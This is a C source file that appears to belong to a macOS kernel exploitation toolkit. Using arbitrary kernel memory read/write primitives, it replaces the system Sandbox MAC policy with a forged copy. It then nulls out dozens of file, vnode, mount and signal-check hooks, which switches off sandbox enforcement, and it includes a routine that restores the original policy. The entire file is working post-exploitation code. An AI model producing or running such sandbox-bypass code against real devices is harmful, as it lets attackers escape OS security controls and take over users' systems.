//
//  sandbox.c
//  playground
//
//  Created by sreejith on 3/8/22.
//

#include <stdlib.h>
#include <string.h>

#include <sys/errno.h>

#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/assert.h"
#include "allocator/small_mem.h"

#include <macos/kernel.h>

#include "util/sandbox.h"


struct xe_util_sandbox {
    xe_allocator_small_mem_t fake_mpc_allocator;
    xe_allocator_small_mem_t fake_mpo_allocator;
    
    uintptr_t fake_mpc;
    uintptr_t fake_mpo;
    
    uintptr_t sandbox_mpc;
};


int xe_sandbox_find_mac_policy_conf(char* mpc_name, uintptr_t* out, int* index_out) {
    uintptr_t mac_policy_list = xe_slider_kernel_slide(VAR_MAC_POLICY_LIST);
    
    uint maxindex = xe_kmem_read_uint32(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_MAXINDEX_OFFSET);
    uintptr_t entries = xe_kmem_read_uint64(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET);
    
    for (int i=0; i<maxindex; i++) {
        uintptr_t entry = entries + i * 8;
        uintptr_t mpc = xe_kmem_read_uint64(entry, 0);
        char name[16];
        bzero(name, sizeof(name));
        xe_kmem_read(name, xe_kmem_read_uint64(mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_NAME_OFFSET), 0, sizeof(name));
        
        if (strncmp(mpc_name, name, sizeof(name)) == 0) {
            *out = mpc;
            if (index_out) { *index_out = i; };
            return 0;
        }
    }
    
    return ENOENT;
}


xe_util_sandbox_t xe_util_sandbox_create(void) {
    uintptr_t fake_mpc;
    xe_allocator_small_mem_t fake_mpc_allocator = xe_allocator_small_mem_allocate(TYPE_MAC_POLICY_CONF_SIZE, &fake_mpc);

    uintptr_t fake_mpo;
    xe_allocator_small_mem_t fake_mpo_allocator = xe_allocator_small_mem_allocate(TYPE_MAC_POLICY_OPS_SIZE, &fake_mpo);
    
    uintptr_t mac_policy_list = xe_slider_kernel_slide(VAR_MAC_POLICY_LIST);
    uintptr_t mac_policy_entries = xe_kmem_read_uint64(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET);
    
    uintptr_t sandbox_mpc;
    int sandbox_mpc_index;
    int error = xe_sandbox_find_mac_policy_conf("Sandbox", &sandbox_mpc, &sandbox_mpc_index);
    xe_assert_err(error);

    uintptr_t sandbox_mpo = xe_kmem_read_uint64(sandbox_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET);
    xe_kmem_copy(fake_mpc, sandbox_mpc, TYPE_MAC_POLICY_CONF_SIZE);
    xe_kmem_copy(fake_mpo, sandbox_mpo, TYPE_MAC_POLICY_OPS_SIZE);
    xe_kmem_write_uint64(fake_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET, fake_mpo);
    xe_kmem_write_uint64(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index, fake_mpc);
    
    xe_util_sandbox_t util = malloc(sizeof(struct xe_util_sandbox));
    util->fake_mpc_allocator = fake_mpc_allocator;
    util->fake_mpo_allocator = fake_mpo_allocator;
    util->fake_mpc = fake_mpc;
    util->fake_mpo = fake_mpo;
    util->sandbox_mpc = sandbox_mpc;
    return util;
}


void xe_util_sandbox_disable_fs_restrictions(xe_util_sandbox_t util) {
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_CHANGE_OFFSET, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_CREATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_DUP, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_FCNTL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_GET_OFFSET, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_GET, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_INHERIT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_IOCTL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_LOCK, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_MMAP_DOWNGRADE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_MMAP, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_RECEIVE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_CHECK_SET, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_LABEL_INIT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_LABEL_DESTROY, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_LABEL_ASSOCIATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_FILE_NOTIFY_CLOSE, 0);
    
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETACL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETATTRLIST, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETEXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETFLAGS, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETMODE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETOWNER, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SETUTIMES, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_TRUNCATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_GETATTRLISTBULK, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_SWAP, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_COPYFILE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_RENAME, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_TRIGGER_RESOLVE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_RECLAIM, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_RECLAIM, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_CLONE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_ACCESS, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_CHDIR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_CHROOT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_CREATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_DELETEEXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_EXCHANGEDATA, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_EXEC, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_GETATTRLIST, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_GETEXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_IOCTL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_KQFILTER, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_LABLE_UPDATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_LINK, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_LISTEXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_LOOKUP, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_OPEN, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_READ, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_READDIR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_READLINK, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_RENAME_FROM, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_RENAME_TO, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_REVOKE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SELECT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETATTRLIST, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETEXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETFLAGS, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETMODE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETOWNER, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETUTIMES, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_STAT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_TRUNCATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_UNLINK, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_UNLINK, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_WRITE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_DEVFS, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_EXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_FILE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_PIPE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_POSIXSEM, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_POSIXSHM, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_SINGLELABEL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_ASSOCIATE_SOCKET, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_COPY, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_DESTROY, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_EXTERNALIZE_AUDIT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_EXTERNALIZE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_INIT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_INTERNALIZE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_RECYCLE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_STORE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_UPDATE_EXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_LABEL_UPDATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_CREATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SIGNATURE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_UIPC_BIND, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_UIPC_CONNECT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SUPPLEMENTAL_SIGNATURE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SEARCHFS, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_FSGETPATH, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_RENAME, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_SETACL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_DELETEEXTATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_LOOKUP_PREFLIGHT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_OPEN, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_FIND_SIGS, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_NOTIFY_LINK, 0);
    
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_QUOTACTL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_FSCTL, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_GETATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_LABEL_UPDATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_MOUNT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_REMOUNT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_SETATTR, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_STAT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_UMOUNT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_LABEL_ASSOCIATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_LABEL_DESTROY, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_LABEL_EXTERNALIZE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_LABEL_INIT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_LABEL_INTERNALIZE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_MOUNT_LATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_SNAPSHOT_MOUNT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_SNAPSHOT_REVERT, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_SNAPSHOT_CREATE, 0);
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_MOUNT_CHECK_SNAPSHOT_DELETE, 0);
}

void xe_util_sandbox_disable_signal_check(xe_util_sandbox_t util) {
    xe_kmem_write_uint64(util->fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_PROC_CHECK_SIGNAL, 0);
}

void xe_util_sandbox_destroy(xe_util_sandbox_t* util_p) {
    xe_util_sandbox_t util = *util_p;
    
    uintptr_t sandbox_mpc;
    int sandbox_mpc_index;
    int error = xe_sandbox_find_mac_policy_conf("Sandbox", &sandbox_mpc, &sandbox_mpc_index);
    xe_assert_err(error);
    xe_assert_cond(sandbox_mpc, ==, util->fake_mpc);
    
    uintptr_t mac_policy_list = xe_slider_kernel_slide(VAR_MAC_POLICY_LIST);
    uintptr_t mac_policy_entries = xe_kmem_read_uint64(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET);
    
    xe_kmem_write_uint64(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index, util->sandbox_mpc);
    xe_allocator_small_mem_destroy(&util->fake_mpc_allocator);
    xe_allocator_small_mem_destroy(&util->fake_mpo_allocator);
    
    free(util);
    *util_p = NULL;
}
